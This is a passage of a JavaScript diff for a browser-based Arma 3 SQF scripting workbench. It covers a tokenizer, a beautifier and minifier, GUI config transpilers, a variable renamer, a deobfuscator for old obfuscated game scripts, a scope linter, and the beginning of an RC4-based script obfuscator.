+         * 1. ACE EDITORS INITIALIZATION & TAB NAVIGATION
+         *************************************************************************/
+        function initAceEditor(elementId, initialValue = '') {
+            const editor = ace.edit(elementId);
+            editor.setTheme("ace/theme/tomorrow_night_eighties");
+            editor.session.setMode("ace/mode/c_cpp");
+            editor.session.setUseWrapMode(true);
+            editor.setOption("showPrintMargin", false);
+            editor.$blockScrolling = Infinity;
+            editor.setValue(initialValue, -1);
+            return editor;
+        }
+
+        function switchWorkbench(targetId) {
+            const panels = ['studio', 'obfuscator', 'rap', 'teardown'];
+            panels.forEach(id => {
+                const panel = document.getElementById(`wb-${id}`);
+                const tab = document.getElementById(`tab-${id}`);
+                if (id === targetId) {
+                    panel.classList.remove('hidden');
+                    panel.classList.add('flex');
+                    tab.className = "wb-tab flex-1 lg:flex-initial px-3.5 py-2 rounded-lg text-xs font-mono font-semibold transition-all flex items-center justify-center gap-2 bg-amber-500 text-slate-950 shadow";
+                    gsap.fromTo(panel, { opacity: 0, y: 8 }, { opacity: 1, y: 0, duration: 0.25, ease: "power2.out" });
+                } else {
+                    panel.classList.add('hidden');
+                    panel.classList.remove('flex');
+                    tab.className = "wb-tab flex-1 lg:flex-initial px-3.5 py-2 rounded-lg text-xs font-mono font-medium transition-all flex items-center justify-center gap-2 text-slate-300 hover:text-white hover:bg-rv-surface";
+                }
+            });
+
+            // Resize Ace instances when switching tabs
+            setTimeout(() => {
+                if (targetId === 'studio') {
+                    aceStudioInput.resize();
+                    aceStudioOutput.resize();
+                } else if (targetId === 'obfuscator') {
+                    aceObfInput.resize();
+                    aceObfOutput.resize();
+                    runHardenedObfuscator();
+                    rebuildBinaryPboPreview();
+                } else if (targetId === 'rap') {
+                    aceRapOutput.resize();
+                } else if (targetId === 'teardown') {
+                    runFloat32DriftSimulation();
+                }
+            }, 60);
+        }
+
+        /*************************************************************************
+         * 2. WORKBENCH 1: AST-AWARE SQF LEXER, BEAUTIFIER, MINIFIER & TRANSPILERS
+         *************************************************************************/
+        /**
+         * Tokenizes SQF / HPP source into typed tokens:
+         * - PREPROCESSOR (#define, #include, #ifdef, etc., supporting backslash continuations)
+         * - COMMENT_LINE (//...)
+         * - COMMENT_BLOCK (/* ... * /)
+         * - STRING ("..." or '...')
+         * - CODE (identifiers, punctuation, operators)
+         */
+        function tokenizeSqfSource(src) {
+            const tokens = [];
+            let i = 0;
+            const len = src.length;
+
+            while (i < len) {
+                const ch = src[i];
+                const next = src[i + 1] || '';
+
+                // 1. Preprocessor Directive at start of line or after whitespace
+                if (ch === '#') {
+                    let prevNonWs = i - 1;
+                    while (prevNonWs >= 0 && (src[prevNonWs] === ' ' || src[prevNonWs] === '\t')) prevNonWs--;
+                    if (prevNonWs < 0 || src[prevNonWs] === '\n' || src[prevNonWs] === '\r') {
+                        let start = i;
+                        while (i < len) {
+                            if (src[i] === '\\' && (src[i + 1] === '\n' || (src[i + 1] === '\r' && src[i + 2] === '\n'))) {
+                                i += (src[i + 1] === '\r') ? 3 : 2;
+                                continue;
+                            }
+                            if (src[i] === '\n') {
+                                i++;
+                                break;
+                            }
+                            i++;
+                        }
+                        tokens.push({ type: 'PREPROCESSOR', value: src.slice(start, i).trim() });
+                        continue;
+                    }
+                }
+
+                // 2. Single-line Comment //
+                if (ch === '/' && next === '/') {
+                    let start = i;
+                    i += 2;
+                    while (i < len && src[i] !== '\n') i++;
+                    tokens.push({ type: 'COMMENT_LINE', value: src.slice(start, i).trim() });
+                    continue;
+                }
+
+                // 3. Block Comment /* ... */
+                if (ch === '/' && next === '*') {
+                    let start = i;
+                    i += 2;
+                    while (i < len && !(src[i] === '*' && src[i + 1] === '/')) i++;
+                    i += 2;
+                    tokens.push({ type: 'COMMENT_BLOCK', value: src.slice(start, i) });
+                    continue;
+                }
+
+                // 4. Double or Single Quoted String (handling "" escaped quotes inside SQF strings)
+                if (ch === '"' || ch === "'") {
+                    const quote = ch;
+                    let start = i;
+                    i++;
+                    while (i < len) {
+                        if (src[i] === quote) {
+                            if (src[i + 1] === quote) {
+                                i += 2; // Escaped doubled quote in SQF
+                                continue;
+                            }
+                            i++;
+                            break;
+                        }
+                        i++;
+                    }
+                    tokens.push({ type: 'STRING', value: src.slice(start, i) });
+                    continue;
+                }
+
+                // 5. Code chunk
+                let start = i;
+                while (i < len) {
+                    const c = src[i];
+                    const n = src[i + 1] || '';
+                    if ((c === '/' && (n === '/' || n === '*')) || c === '"' || c === "'") break;
+                    if (c === '#') {
+                        let p = i - 1;
+                        while (p >= start && (src[p] === ' ' || src[p] === '\t')) p--;
+                        if (p < 0 || src[p] === '\n' || src[p] === '\r') break;
+                    }
+                    i++;
+                }
+                tokens.push({ type: 'CODE', value: src.slice(start, i) });
+            }
+            return tokens;
+        }
+
+        /**
+         * AST-Aware SQF Beautifier:
+         * Preserves #define / #include directives on dedicated lines, keeps strings intact,
+         * formats braces { } and statements ; with clean 4-space indentation.
+         */
+        function astBeautifySqf(src) {
+            const tokens = tokenizeSqfSource(src);
+            let indentLevel = 0;
+            const indentStr = () => '    '.repeat(Math.max(0, indentLevel));
+            let out = '';
+            let atLineStart = true;
+
+            function appendLine(text) {
+                out = out.replace(/[ \t]+$/, '');
+                if (out.length > 0 && !out.endsWith('\n')) out += '\n';
+                out += indentStr() + text + '\n';
+                atLineStart = true;
+            }
+
+            for (let t = 0; t < tokens.length; t++) {
+                const tok = tokens[t];
+                if (tok.type === 'PREPROCESSOR') {
+                    out = out.replace(/[ \t]+$/, '');
+                    if (out.length > 0 && !out.endsWith('\n')) out += '\n';
+                    out += tok.value + '\n';
+                    atLineStart = true;
+                } else if (tok.type === 'COMMENT_LINE') {
+                    appendLine(tok.value);
+                } else if (tok.type === 'COMMENT_BLOCK') {
+                    appendLine(tok.value);
+                } else if (tok.type === 'STRING') {
+                    if (atLineStart) {
+                        out += indentStr();
+                        atLineStart = false;
+                    }
+                    out += tok.value;
+                } else if (tok.type === 'CODE') {
+                    // Normalize whitespace inside code segment
+                    const normalized = tok.value
+                        .replace(/\r\n/g, '\n')
+                        .replace(/[ \t\n]+/g, ' ')
+                        .replace(/\s*([;{}])\s*/g, '$1')
+                        .replace(/\s*(==|!=|<=|>=|&&|\|\|)\s*/g, ' $1 ')
+                        .replace(/\s*,\s*/g, ', ');
+
+                    for (let cIdx = 0; cIdx < normalized.length; cIdx++) {
+                        const ch = normalized[cIdx];
+                        if (ch === '{') {
+                            if (atLineStart) {
+                                out += indentStr();
+                            } else if (!out.endsWith(' ') && !out.endsWith('(') && !out.endsWith('[')) {
+                                out += ' ';
+                            }
+                            out += '{\n';
+                            indentLevel++;
+                            atLineStart = true;
+                        } else if (ch === '}') {
+                            indentLevel = Math.max(0, indentLevel - 1);
+                            out = out.replace(/[ \t]+$/, '');
+                            if (out.length > 0 && !out.endsWith('\n')) out += '\n';
+                            out += indentStr() + '}';
+                            // If next char is ';' keep it on the same line
+                            if (normalized[cIdx + 1] === ';') {
+                                out += ';\n';
+                                cIdx++;
+                            } else {
+                                out += '\n';
+                            }
+                            atLineStart = true;
+                        } else if (ch === ';') {
+                            out += ';\n';
+                            atLineStart = true;
+                        } else {
+                            if (atLineStart) {
+                                if (ch === ' ') continue;
+                                out += indentStr();
+                                atLineStart = false;
+                            }
+                            out += ch;
+                        }
+                    }
+                }
+            }
+            return out.replace(/\n{3,}/g, '\n\n').trim();
+        }
+
+        /**
+         * Macro-Safe Production SQF Minifier:
+         * Unlike the broken 2016 minifyCode (which turned `* ` and `/ ` into `>`),
+         * this preserves strings and #define/#include directives while compacting code tokens.
+         */
+        function astMinifySqf(src) {
+            const tokens = tokenizeSqfSource(src);
+            let out = '';
+
+            for (const tok of tokens) {
+                if (tok.type === 'COMMENT_LINE' || tok.type === 'COMMENT_BLOCK') {
+                    continue;
+                }
+                if (tok.type === 'PREPROCESSOR') {
+                    if (out.length > 0 && !out.endsWith('\n')) out += '\n';
+                    out += tok.value + '\n';
+                } else if (tok.type === 'STRING') {
+                    out += tok.value;
+                } else if (tok.type === 'CODE') {
+                    let compact = tok.value
+                        .replace(/[\r\n\t]+/g, ' ')
+                        .replace(/\s{2,}/g, ' ')
+                        .replace(/\s*([,;{}()\[\]=<>+\-*\/!:|&])\s*/g, '$1');
+                    out += compact;
+                }
+            }
+            return out.trim();
+        }
+
+        /**
+         * Strip Comments only (preserving strings and layout)
+         */
+        function stripSqfComments(src) {
+            const tokens = tokenizeSqfSource(src);
+            return tokens
+                .filter(t => t.type !== 'COMMENT_LINE' && t.type !== 'COMMENT_BLOCK')
+                .map(t => t.type === 'PREPROCESSOR' ? t.value + '\n' : t.value)
+                .join('')
+                .replace(/\n{3,}/g, '\n\n')
+                .trim();
+        }
+
+        /**
+         * HPP GUI Class -> Dynamic ctrlCreate SQF Transpiler
+         */
+        function transpileHppToSqf(src, defaultIdd = '4600') {
+            const iddMatch = src.match(/\bidd\s*=\s*(-?\d+)\s*;/i);
+            const idd = iddMatch ? iddMatch[1] : (defaultIdd.replace(/\D/g, '') || '4600');
+
+            // Match all control class blocks that contain an idc property
+            const classRegex = /class\s+([a-zA-Z0-9_]+)\s*:\s*([a-zA-Z0-9_]+)\s*\{([\s\S]*?)\};/g;
+            let match;
+            const controls = [];
+
+            while ((match = classRegex.exec(src)) !== null) {
+                const className = match[1];
+                const baseClass = match[2];
+                const body = match[3];
+
+                const getProp = (propRegex) => {
+                    const m = propRegex.exec(body);
+                    return m ? m[1].trim() : null;
+                };
+
+                const idc = getProp(/\bidc\s*=\s*(-?\d+)\s*;/i);
+                if (!idc) continue;
+
+                controls.push({
+                    className,
+                    baseClass,
+                    idc,
+                    x: getProp(/\bx\s*=\s*([^;]+);/i) || '0',
+                    y: getProp(/\by\s*=\s*([^;]+);/i) || '0',
+                    w: getProp(/\bw\s*=\s*([^;]+);/i) || '0.1',
+                    h: getProp(/\bh\s*=\s*([^;]+);/i) || '0.1',
+                    text: getProp(/\btext\s*=\s*"([^"]*)"\s*;/i),
+                    tooltip: getProp(/\btooltip\s*=\s*"([^"]*)"\s*;/i),
+                    font: getProp(/\bfont\s*=\s*"([^"]*)"\s*;/i),
+                    sizeEx: getProp(/\bsizeEx\s*=\s*([^;]+);/i),
+                    action: getProp(/\b(?:action|onButtonClick)\s*=\s*"([\s\S]*?)"\s*;/i),
+                    colorText: getProp(/\bcolorText\[\]\s*=\s*\{([^}]+)\}\s*;/i),
+                    colorBackground: getProp(/\bcolorBackground\[\]\s*=\s*\{([^}]+)\}\s*;/i),
+                    colorActive: getProp(/\bcolorActive\[\]\s*=\s*\{([^}]+)\}\s*;/i)
+                });
+            }
+
+            if (controls.length === 0) {
+                return `// [RV4 TRANSPILER NOTICE]: No HPP GUI classes with 'class Name: BaseClass { idc = ...; }' detected.\n// Load Preset #2 ("GUI Editor Dialog Class") from the dropdown above to test!`;
+            }
+
+            let sqf = `// ============================================================================\n`;
+            sqf += `// RV4 DYNAMIC GUI TRANSPILER OUTPUT (Target IDD: ${idd} | Controls: ${controls.length})\n`;
+            sqf += `// ============================================================================\n`;
+            sqf += `disableSerialization;\n`;
+            sqf += `private _display = findDisplay ${idd};\n`;
+            sqf += `if (isNull _display) then {\n    _display = (findDisplay 46) createDisplay "RscDisplayEmpty";\n};\n\n`;
+
+            for (const c of controls) {
+                const v = `_${c.className}`;
+                sqf += `// --- Control: ${c.className} (${c.baseClass}, IDC ${c.idc}) ---\n`;
+                sqf += `private ${v} = _display ctrlCreate ["${c.baseClass}", ${c.idc}];\n`;
+                sqf += `${v} ctrlSetPosition [${c.x}, ${c.y}, ${c.w}, ${c.h}];\n`;
+                if (c.text !== null) {
+                    if (c.baseClass.toLowerCase().includes('structuredtext')) {
+                        sqf += `${v} ctrlSetStructuredText parseText "${c.text}";\n`;
+                    } else {
+                        sqf += `${v} ctrlSetText "${c.text}";\n`;
+                    }
+                }
+                if (c.colorText) sqf += `${v} ctrlSetTextColor [${c.colorText}];\n`;
+                if (c.colorBackground) sqf += `${v} ctrlSetBackgroundColor [${c.colorBackground}];\n`;
+                if (c.colorActive) sqf += `${v} ctrlSetActiveColor [${c.colorActive}];\n`;
+                if (c.font) sqf += `${v} ctrlSetFont "${c.font}";\n`;
+                if (c.sizeEx) sqf += `${v} ctrlSetFontHeight (${c.sizeEx});\n`;
+                if (c.tooltip) sqf += `${v} ctrlSetTooltip "${c.tooltip}";\n`;
+                if (c.action) sqf += `${v} buttonSetAction "${c.action}";\n`;
+                sqf += `${v} ctrlCommit 0;\n\n`;
+            }
+            return sqf.trim();
+        }
+
+        /**
+         * Reverse Transpiler: Dynamic ctrlCreate SQF -> HPP GUI Class
+         */
+        function transpileSqfToHpp(src, defaultIdd = '4600') {
+            const createRegex = /(?:private\s+)?(_[a-zA-Z0-9_]+)\s*=\s*[^;]*ctrlCreate\s*\[\s*"([^"]+)"\s*,\s*(-?\d+)\s*\]\s*;/g;
+            let match;
+            const controls = [];
+
+            while ((match = createRegex.exec(src)) !== null) {
+                const varName = match[1];
+                const baseClass = match[2];
+                const idc = match[3];
+                const className = varName.replace(/^_/, '');
+
+                const escapedVar = varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+                const getCmd = (cmd, pattern) => {
+                    const re = new RegExp(escapedVar + '\\s+' + cmd + '\\s*' + pattern, 'i');
+                    const m = re.exec(src);
+                    return m ? m[1].trim() : null;
+                };
+
+                const pos = getCmd('ctrlSetPosition', '\\[([^\\]]+)\\]\\s*;');
+                let x = '0', y = '0', w = '0.1', h = '0.1';
+                if (pos) {
+                    const parts = pos.split(',').map(s => s.trim());
+                    if (parts.length >= 4) [x, y, w, h] = parts;
+                }
+
+                controls.push({
+                    className,
+                    baseClass,
+                    idc,
+                    x, y, w, h,
+                    text: getCmd('ctrlSetText', '"([^"]*)"\\s*;'),
+                    colorText: getCmd('ctrlSetTextColor', '\\[([^\\]]+)\\]\\s*;'),
+                    colorBackground: getCmd('ctrlSetBackgroundColor', '\\[([^\\]]+)\\]\\s*;'),
+                    colorActive: getCmd('ctrlSetActiveColor', '\\[([^\\]]+)\\]\\s*;'),
+                    font: getCmd('ctrlSetFont', '"([^"]*)"\\s*;'),
+                    sizeEx: getCmd('ctrlSetFontHeight', '\\(?([^;\\)]+)\\)?\\s*;'),
+                    tooltip: getCmd('ctrlSetTooltip', '"([^"]*)"\\s*;'),
+                    action: getCmd('buttonSetAction', '"([^"]*)"\\s*;')
+                });
+            }
+
+            if (controls.length === 0) {
+                return `// [RV4 TRANSPILER NOTICE]: No 'ctrlCreate ["Class", idc]' statements found in input.\n// First convert an HPP Dialog to SQF, then click 'ctrlCreate SQF -> HPP Class'!`;
+            }
+
+            let hpp = `// ============================================================================\n`;
+            hpp += `// RECONSTRUCTED DIALOG HPP CONFIG (${controls.length} Controls)\n`;
+            hpp += `// ============================================================================\n`;
+            hpp += `class RscReconstructedDialog {\n    idd = ${defaultIdd.replace(/\D/g, '') || 4600};\n    movingEnable = 1;\n    class controls {\n`;
+
+            for (const c of controls) {
+                hpp += `        class ${c.className}: ${c.baseClass} {\n`;
+                hpp += `            idc = ${c.idc};\n`;
+                if (c.text !== null) hpp += `            text = "${c.text}";\n`;
+                hpp += `            x = ${c.x};\n`;
+                hpp += `            y = ${c.y};\n`;
+                hpp += `            w = ${c.w};\n`;
+                hpp += `            h = ${c.h};\n`;
+                if (c.colorText) hpp += `            colorText[] = {${c.colorText}};\n`;
+                if (c.colorBackground) hpp += `            colorBackground[] = {${c.colorBackground}};\n`;
+                if (c.colorActive) hpp += `            colorActive[] = {${c.colorActive}};\n`;
+                if (c.font) hpp += `            font = "${c.font}";\n`;
+                if (c.sizeEx) hpp += `            sizeEx = ${c.sizeEx};\n`;
+                if (c.tooltip) hpp += `            tooltip = "${c.tooltip}";\n`;
+                if (c.action) hpp += `            action = "${c.action}";\n`;
+                hpp += `        };\n`;
+            }
+            hpp += `    };\n};`;
+            return hpp;
+        }
+
+        /**
+         * Scope-Safe Local & Global Variable Renamer (Skips comments, strings, and Arma 3 Magic Variables)
+         */
+        function renameSqfVariables(src, mode = 'local', customPrefix = '', protectedCsv = '') {
+            const tokens = tokenizeSqfSource(src);
+            const userProtected = new Set(
+                protectedCsv.split(',').map(s => s.trim()).filter(Boolean)
+            );
+            const varMap = new Map();
+            let counter = 0;
+
+            const cleanPrefix = customPrefix.replace(/[^a-zA-Z0-9_]/g, '') || (mode === 'local' ? 'v' : 'RV_g');
+
+            // First pass: discover variables in CODE tokens (and inside params/private arrays)
+            for (const tok of tokens) {
+                if (tok.type === 'CODE') {
+                    if (mode === 'local') {
+                        const localMatches = tok.value.match(/\b_[a-zA-Z0-9_]+\b/g) || [];
+                        for (const m of localMatches) {
+                            if (!ARMA3_MAGIC_VARS.has(m) && !userProtected.has(m) && !varMap.has(m)) {
+                                varMap.set(m, `_${cleanPrefix.replace(/^_/, '')}_${counter++}`);
+                            }
+                        }
+                    } else {
+                        const globalMatches = tok.value.match(/\b([a-zA-Z][a-zA-Z0-9_]*)\s*(?==(?!=))/g) || [];
+                        for (const raw of globalMatches) {
+                            const m = raw.trim();
+                            if (!ARMA3_MAGIC_VARS.has(m) && !userProtected.has(m) && !varMap.has(m)) {
+                                varMap.set(m, `${cleanPrefix}_${counter++}`);
+                            }
+                        }
+                    }
+                } else if (tok.type === 'STRING' && mode === 'local') {
+                    // Check if string is an exact local variable name inside private ["_a"] or params [["_a"]]
+                    const inner = tok.value.slice(1, -1);
+                    if (/^_[a-zA-Z0-9_]+$/.test(inner) && !ARMA3_MAGIC_VARS.has(inner) && !userProtected.has(inner)) {
+                        if (!varMap.has(inner)) {
+                            varMap.set(inner, `_${cleanPrefix.replace(/^_/, '')}_${counter++}`);
+                        }
+                    }
+                }
+            }
+
+            // Second pass: replace in CODE tokens and exact "_var" strings
+            return tokens.map(tok => {
+                if (tok.type === 'CODE') {
+                    let updated = tok.value;
+                    for (const [orig, repl] of varMap.entries()) {
+                        const re = new RegExp(`\\b${orig}\\b`, 'g');
+                        updated = updated.replace(re, repl);
+                    }
+                    return updated;
+                } else if (tok.type === 'STRING' && mode === 'local') {
+                    const quote = tok.value[0];
+                    const inner = tok.value.slice(1, -1);
+                    if (varMap.has(inner)) {
+                        return `${quote}${varMap.get(inner)}${quote}`;
+                    }
+                } else if (tok.type === 'PREPROCESSOR') {
+                    return tok.value + '\n';
+                }
+                return tok.value;
+            }).join('');
+        }
+
+        /**
+         * Universal Deobfuscator for 2016 a3-webbased-tools Payloads
+         * Cracks Iseco Custom Key, SquareRoot array, Unicode array, and SplitString
+         */
+        function decryptLegacy2016Payload(src, manualKey = '') {
+            // 1. Check for Iseco / SquareRoot / Unicode numeric array [...]
+            const arrayMatch = src.match(/\[\s*(\d+(?:\s*,\s*\d+)+)\s*\]/);
+            if (arrayMatch) {
+                const nums = arrayMatch[1].split(',').map(n => parseFloat(n.trim()));
+
+                // Subcase A: SquareRoot (`sqrt _x`)
+                if (/sqrt\s*\(?\s*_x/i.test(src)) {
+                    const offsetMatch = src.match(/_x\s*-\s*\(?(\d+)\)?/);
+                    const offset = offsetMatch ? parseFloat(offsetMatch[1]) : 0;
+                    const decoded = nums.map(n => String.fromCharCode(Math.round(Math.sqrt(Math.max(0, n - offset))))).join('');
+                    return `// [DEOBFUSCATED 2016 SQUAREROOT PAYLOAD]\n` + astBeautifySqf(decoded);
+                }
+
+                // Subcase B: Plain Unicode `toString [...]`
+                if (/tostring\s*\[/i.test(src) && !/_Decrypt/i.test(src)) {
+                    const decoded = nums.map(n => String.fromCharCode(n)).join('');
+                    return `// [DEOBFUSCATED 2016 UNICODE ARRAY]\n` + astBeautifySqf(decoded);
+                }
+
+                // Subcase C: Iseco Key Multiplication (`(_decryptme select _i) / (_Array select _counter)`)
+                let key = manualKey.trim();
+                const keyMatch = src.match(/_Key\s*=\s*(['"])(.*?)\1/i);
+                if (keyMatch) {
+                    key = keyMatch[2];
+                }
+                if (key) {
+                    let out = '';
+                    for (let i = 0; i < nums.length; i++) {
+                        const kChar = key.charCodeAt(i % key.length);
+                        out += String.fromCharCode(Math.round(nums[i] / kChar));
+                    }
+                    return `// ============================================================================\n// [CRACKED 2016 ISECO PAYLOAD | Extracted Key: "${key}"]\n// ============================================================================\n` + astBeautifySqf(out);
+                }
+            }
+
+            // 2. Check for ReverseString (`_1=toArray('...');reverse _1`)
+            const revMatch = src.match(/toArray\s*\(\s*(['"])([\s\S]*?)\1\s*\)\s*;\s*reverse/i);
+            if (revMatch) {
+                const reversed = revMatch[2].split('').reverse().join('');
+                return `// [DEOBFUSCATED 2016 REVERSE STRING]\n` + astBeautifySqf(reversed);
+            }
+
+            return `// [RV4 DECRYPTOR NOTICE]: Could not detect a 2016 Iseco, SquareRoot, or Unicode array in the input buffer.\n// Select Preset #3 ("Legacy 2016 Iseco Encrypted Payload") to test automatic key extraction!`;
+        }
+
+        /**
+         * RV4 Static Diagnostics & Scope Linter
+         */
+        function runStaticLinter() {
+            const src = aceStudioInput.getValue();
+            const lines = src.split('\n');
+            const diagnostics = [];
+
+            // Collect all declared private variables across the script (`private _var`, `private ["_a", "_b"]`, `params [...]`)
+            const declaredPrivates = new Set([...ARMA3_MAGIC_VARS]);
+            const privSingleRegex = /\bprivate\s+(_[a-zA-Z0-9_]+)/g;
+            let m;
+            while ((m = privSingleRegex.exec(src)) !== null) {
+                declaredPrivates.add(m[1]);
+            }
+            const privArrayStrings = src.match(/\b(?:private|params)\s*\[([\s\S]*?)\]/g) || [];
+            for (const block of privArrayStrings) {
+                const strVars = block.match(/["'](_[a-zA-Z0-9_]+)["']/g) || [];
+                for (const sv of strVars) {
+                    declaredPrivates.add(sv.slice(1, -1));
+                }
+            }
+
+            lines.forEach((line, idx) => {
+                const lineNum = idx + 1;
+                const cleanLine = line.replace(/\/\/.*$/, '').trim();
+                if (!cleanLine || cleanLine.startsWith('#')) return;
+
+                // 1. Check for unscoped local variable assignment: `_foo = ...` without `private`
+                const assignRegex = /(?:^|[;{])\s*(_[a-zA-Z0-9_]+)\s*=(?!=)/g;
+                let am;
+                while ((am = assignRegex.exec(cleanLine)) !== null) {
+                    const vName = am[1];
+                    if (!declaredPrivates.has(vName)) {
+                        diagnostics.push({
+                            severity: 'WARN',
+                            line: lineNum,
+                            category: 'Leaked Local Scope',
+                            message: `Local variable '${vName}' assigned without 'private ${vName}' or 'params' declaration; risks polluting parent call scope.`
+                        });
+                        declaredPrivates.add(vName);
+                    }
+                }
+
+                // 2. Unscheduled suspension risks (`sleep`, `uiSleep`, `waitUntil`)
+                if (/\b(sleep|uiSleep|waitUntil)\b/.test(cleanLine) && !/canSuspend/.test(src)) {
+                    diagnostics.push({
+                        severity: 'INFO',
+                        line: lineNum,
+                        category: 'Scheduler Suspension',
+                        message: `Suspension command ('sleep'/'waitUntil') used without 'if (canSuspend)' guard; will throw Generic Error in Expression if invoked via 'call' from unscheduled context.`
+                    });
+                }
+
+                // 3. Deprecated / Dangerous Arma Commands
+                if (/\bcall\s+compile\s+format\b/i.test(cleanLine)) {
+                    diagnostics.push({
+                        severity: 'CRIT',
+                        line: lineNum,
+                        category: 'Code Injection / Perf',
+                        message: `'call compile format' compiles a dynamic string at runtime (severe scheduler stall & SQF injection vector). Use 'missionNamespace setVariable' instead.`
+                    });
+                }
+                if (/\b(setVehicleInit|processInitCommands|clearVehicleInit)\b/i.test(cleanLine)) {
+                    diagnostics.push({
+                        severity: 'CRIT',
+                        line: lineNum,
+                        category: 'Removed A2 Command',
+                        message: `Legacy Arma 2 command ('setVehicleInit') was removed in Arma 3 for security; use 'remoteExec' or 'remoteExecCall'.`
+                    });
+                }
+            });
+
+            // Render table
+            const tbody = document.getElementById('linterTableBody');
+            const badge = document.getElementById('linterSummaryBadge');
+
+            if (diagnostics.length === 0) {
+                badge.className = "px-2 py-0.5 rounded text-[11px] font-mono bg-emerald-500/15 text-emerald-300 border border-emerald-500/30";
+                badge.textContent = "0 Issues Detected (Clean)";
+                tbody.innerHTML = `<tr><td colspan="4" class="py-4 px-4 text-center text-emerald-400"><i class="fa-solid fa-circle-check mr-1.5"></i>All local variables properly scoped and zero deprecated commands found.</td></tr>`;
+            } else {
+                badge.className = "px-2 py-0.5 rounded text-[11px] font-mono bg-amber-500/15 text-amber-300 border border-amber-500/30";
+                badge.textContent = `${diagnostics.length} Diagnostic Finding(s)`;
+                tbody.innerHTML = diagnostics.map(d => {
+                    const sevBadge = d.severity === 'CRIT'
+                        ? `<span class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold">CRITICAL</span>`
+                        : d.severity === 'WARN'
+                        ? `<span class="px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold">WARNING</span>`
+                        : `<span class="px-2 py-0.5 rounded bg-cyan-500/20 text-cyan-300 border border-cyan-500/40">NOTICE</span>`;
+                    return `<tr class="hover:bg-rv-surface/60 transition cursor-pointer" onclick="aceStudioInput.gotoLine(${d.line}, 0, true)">
+                        <td class="py-2 px-4">${sevBadge}</td>
+                        <td class="py-2 px-4 text-amber-300 font-bold">L${d.line}</td>
+                        <td class="py-2 px-4 text-slate-300">${d.category}</td>
+                        <td class="py-2 px-4 text-slate-300">${d.message}</td>
+                    </tr>`;
+                }).join('');
+            }
+        }
+
+        function updateStudioTelemetry() {
+            const inVal = aceStudioInput.getValue();
+            const outVal = aceStudioOutput.getValue();
+            document.getElementById('inputTelemetry').textContent = `${inVal.length} B | ${inVal.split('\n').length} lines`;
+            document.getElementById('outputTelemetry').textContent = `${outVal.length} B | ${outVal.split('\n').length} lines`;
+        }
+
+        function runStudioOperation(op) {
+            const src = aceStudioInput.getValue();
+            const param = document.getElementById('studioParamInput').value;
+            const protectedCsv = document.getElementById('studioProtectedVars').value;
+            let result = '';
+
+            switch (op) {
+                case 'beautify':
+                    result = astBeautifySqf(src);
+                    showToast('AST Beautifier completed (#define directives preserved)', 'emerald');
+                    break;
+                case 'minify':
+                    result = astMinifySqf(src);
+                    showToast(`Minified from ${src.length} B to ${result.length} B`, 'amber');
+                    break;
+                case 'stripComments':
+                    result = stripSqfComments(src);
+                    showToast('Comments stripped cleanly', 'emerald');
+                    break;
+                case 'hppToSqf':
+                    result = transpileHppToSqf(src, param);
+                    showToast('Transpiled HPP GUI Classes to dynamic ctrlCreate SQF', 'cyan');
+                    break;
+                case 'sqfToHpp':
+                    result = transpileSqfToHpp(src, param);
+                    showToast('Reconstructed HPP Dialog Class from ctrlCreate SQF', 'cyan');
+                    break;
+                case 'renameLocal':
+                    result = renameSqfVariables(src, 'local', param, protectedCsv);
+                    showToast('Renamed local variables (Arma 3 magic variables preserved)', 'emerald');
+                    break;
+                case 'renameGlobal':
+                    result = renameSqfVariables(src, 'global', param, protectedCsv);
+                    showToast('Renamed global variables', 'emerald');
+                    break;
+                case 'decryptLegacy':
+                    result = decryptLegacy2016Payload(src, param);
+                    showToast('Deobfuscated legacy 2016 payload', 'amber');
+                    break;
+            }
+
+            aceStudioOutput.setValue(result, -1);
+            updateStudioTelemetry();
+            runStaticLinter();
+        }
+
+        function loadStudioPreset(presetKey) {
+            if (STUDIO_PRESETS[presetKey]) {
+                aceStudioInput.setValue(STUDIO_PRESETS[presetKey], -1);
+                if (presetKey === 'hpp_gui') {
+                    runStudioOperation('hppToSqf');
+                } else if (presetKey === 'iseco_2016') {
+                    runStudioOperation('decryptLegacy');
+                } else {
+                    runStudioOperation('beautify');
+                }
+            }
+        }
+
+        function swapStudioEditors() {
+            const out = aceStudioOutput.getValue();
+            if (out.trim()) {
+                aceStudioInput.setValue(out, -1);
+                updateStudioTelemetry();
+                runStaticLinter();
+                showToast('Swapped Output buffer into Input editor', 'cyan');
+            }
+        }
+
+        function clearEditor(which) {
+            if (which === 'input') {
+                aceStudioInput.setValue('', -1);
+            } else {
+                aceStudioOutput.setValue('', -1);
+            }
+            updateStudioTelemetry();
+        }
+
+        function copyEditorContent(which) {
+            const text = which === 'input' ? aceStudioInput.getValue() : aceStudioOutput.getValue();
+            copyTextToClipboard(text, 'Studio Output');
+        }
+
+        function downloadStudioOutput() {
+            const text = aceStudioOutput.getValue();
+            const isHpp = /class\s+[a-zA-Z0-9_]+\s*\{/.test(text) && !/ctrlCreate/.test(text);
+            downloadBlob(text, isHpp ? 'dialog_export.hpp' : 'rv4_transpiled.sqf');
+        }
+
+        function handleStudioFileUpload(event, target) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                if (target === 'input') {
+                    aceStudioInput.setValue(e.target.result, -1);
+                    updateStudioTelemetry();
+                    runStaticLinter();
+                    showToast(`Loaded ${file.name} (${file.size} bytes)`, 'emerald');
+                }
+            };
+            reader.readAsText(file);
+        }
+
+        /*************************************************************************
+         * 3. WORKBENCH 2: HARDENED RC4-DROP256 OBFUSCATOR & BINARY .PBO PACKER
+         *************************************************************************/
+        /**
+         * Pure-Integer RC4-Drop256 Stream Cipher (KSA + PRGA with 256-byte initial drop)
+         * 100% immune to Arma 3 x64 32-bit float rounding because all numbers are in [0, 255]
+         * and maximum intermediate sum is 255 + 255 = 510 << 16,777,216.
+         */
+        function rc4Drop256Transform(byteArray, keyString) {
+            const keyBytes = [];
+            for (let i = 0; i < keyString.length; i++) {
+                keyBytes.push(keyString.charCodeAt(i) & 0xFF);
+            }
+            if (keyBytes.length === 0) keyBytes.push(0x5A);
+
+            // Key-Scheduling Algorithm (KSA)
+            const S = new Array(256);
+            for (let i = 0; i < 256; i++) S[i] = i;
+            let j = 0;
+            for (let i = 0; i < 256; i++) {
+                j = (j + S[i] + keyBytes[i % keyBytes.length]) % 256;
+                const tmp = S[i];
+                S[i] = S[j];
+                S[j] = tmp;
+            }
+
